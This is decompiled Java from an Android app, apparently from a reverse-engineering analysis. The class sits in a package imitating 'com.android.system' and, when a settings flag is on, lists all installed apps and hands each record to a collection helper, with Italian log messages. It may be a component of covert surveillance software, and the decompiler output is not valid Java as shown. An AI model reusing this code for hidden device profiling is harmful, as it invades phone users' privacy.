package com.android.system;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import com.app.system.common.entity.AppInfo;
import com.app.system.common.h.c;
import com.security.ServiceSettings;
import com.security.d.a;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static b a;
  private Context b = null;
  private boolean c = false;
  
  public static b a()
  {
    try
    {
      if (a == null)
      {
        localb = new com/android/system/b;
        localb.<init>();
        a = localb;
      }
      b localb = a;
      return localb;
    }
    finally {}
  }
  
  public void a(Context paramContext)
  {
    a.d("AppListScanner", "Inizializzazione...", new Object[0]);
    this.b = paramContext;
    AppListReceiver.a(paramContext);
  }
  
  public void b()
  {
    if (ServiceSettings.a().appListActive) {
      if (!this.c)
      {
        if (this.b != null) {
          new a().start();
        } else {
          a.b("AppListScanner", "startScan: init(context) non chiamata!", new Object[0]);
        }
      }
      else {
        a.b("AppListScanner", "La scansione è già in corso", new Object[0]);
      }
    }
  }
  
  private class a
    extends Thread
  {
    private c b = new c(b.a(b.this));
    
    public a()
    {
      super();
    }
    
    public void run()
    {
      if (ServiceSettings.a().appListActive)
      {
        PackageManager localPackageManager = b.a(b.this).getPackageManager();
        Object localObject1 = localPackageManager.getInstalledPackages(0);
        Object localObject2 = new StringBuilder();
        ((StringBuilder)localObject2).append("APP LIST: trovate ");
        ((StringBuilder)localObject2).append(((List)localObject1).size());
        ((StringBuilder)localObject2).append(" app installate");
        a.d("AppListScanner", ((StringBuilder)localObject2).toString(), new Object[0]);
        localObject2 = ((List)localObject1).iterator();
        while (((Iterator)localObject2).hasNext())
        {
          PackageInfo localPackageInfo = (PackageInfo)((Iterator)localObject2).next();
          Object localObject3 = localPackageInfo.applicationInfo.loadLabel(localPackageManager).toString();
          localObject1 = localPackageInfo.packageName;
          Object localObject4 = localPackageInfo.versionName;
          int i = localPackageInfo.applicationInfo.flags;
          boolean bool = true;
          if ((i & 0x1) == 0) {
            bool = false;
          }
          localObject3 = new AppInfo((String)localObject3, (String)localObject1, (String)localObject4, bool);
          if (((AppInfo)localObject3).mSystem) {
            localObject1 = "[SYS]";
          } else {
            localObject1 = "";
          }
          localObject4 = new StringBuilder();
          ((StringBuilder)localObject4).append("APP ");
          ((StringBuilder)localObject4).append((String)localObject1);
          ((StringBuilder)localObject4).append(" name=[");
          ((StringBuilder)localObject4).append(((AppInfo)localObject3).mAppName);
          ((StringBuilder)localObject4).append("], pkg=");
          ((StringBuilder)localObject4).append(((AppInfo)localObject3).mPkgName);
          ((StringBuilder)localObject4).append(", v.");
          ((StringBuilder)localObject4).append(((AppInfo)localObject3).mVersion);
          a.e("AppListScanner", ((StringBuilder)localObject4).toString(), new Object[0]);
          this.b.a((AppInfo)localObject3);
        }
      }
    }
  }
}


/* Location:              ~/com/android/system/b.class
 *
 * Reversed by:           J
 */